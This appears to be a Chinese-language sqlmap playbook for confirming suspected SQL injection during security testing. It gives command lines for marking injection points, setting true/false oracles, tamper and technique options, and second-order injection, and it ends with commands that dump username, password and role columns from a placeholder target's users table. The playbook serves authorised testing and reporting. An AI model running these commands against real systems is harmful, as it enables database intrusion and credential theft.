# sqlmap Verification

sqlmap 只用于已知可疑参数的复核和加速枚举；最终结论仍保留最小手工请求对。

## 准备请求

用原始请求文件保留 Cookie、CSRF、Content-Type 和 body：

```bash
sqlmap -r request.txt -p username --batch --level=2 --risk=1
```

复杂 body 中用 `*` 标出注入点，避免 sqlmap 泛扫错误字段：

```text
username=admin&password=abc*&csrf=...
```

没有请求文件时也要精确标点：

```bash
sqlmap -u "http://target/item?id=1*" --batch
sqlmap -u "http://target/search" --data "q=abc*&csrf=..." --cookie "sid=..." --batch
sqlmap -u "http://target/api" --method POST --headers "Content-Type: application/json" --data '{"name":"abc*"}' --batch
```

## 绑定 Oracle

把已经观察到的稳定信号传给 sqlmap：

```bash
sqlmap -r request.txt -p q --batch --string="true marker"
sqlmap -r request.txt -p q --batch --not-string="false marker"
sqlmap -r request.txt -p id --batch --code=200
```

时间盲注场景再调 `--time-sec`、`--timeout`、`--retries`；不要靠单次延迟下结论。

CSRF、签名、动态时间戳或 nonce 用 `--csrf-token`、`--csrf-url`、`--eval` 或重新抓包解决；不要在过期 token 上解释阴性结果。

## 收窄范围

```bash
sqlmap -r request.txt -p id --batch --dbms=mysql --technique=BU
sqlmap -r request.txt -p sort --batch --technique=B --prefix=")" --suffix="-- -"
sqlmap -r request.txt -p q --batch --tamper=space2comment
```

- `--dbms` 只在已有指纹时使用。
- `--technique` 按 oracle 选择：`B` 布尔、`U` UNION、`E` 错误、`S` stacked、`T` 时间、`Q` inline query。
- `--tamper` 只匹配已证明的过滤点，不要一次挂多个。
- `--prefix/--suffix` 用于已确定闭合方式。
- `--param-del`、`--skip`、`-p` 用于复杂参数解析，避免测错重复参数或数组字段。
- 结果受缓存污染时，用 `--flush-session` 或换 marker 重新跑最小范围。

## 二阶与登录态

二阶触发用第二请求/URL 让 sqlmap 看见结果页：

```bash
sqlmap -r store-request.txt --second-url "http://target/profile" --batch
sqlmap -r store-request.txt --second-req trigger-request.txt --batch
```

登录态失效时重新抓请求；不要让 sqlmap 在过期 session 上跑假阴性。

## 最小枚举

只取推进所需数据：

```bash
sqlmap -r request.txt -p id --batch --current-db
sqlmap -r request.txt -p id --batch -D app --tables
sqlmap -r request.txt -p id --batch -D app -T users --columns
sqlmap -r request.txt -p id --batch -D app -T users -C username,password,role --dump
```

sqlmap 命中后，用手工 true/false 或 UNION 请求复现最小证据；报告不要只贴 sqlmap banner。
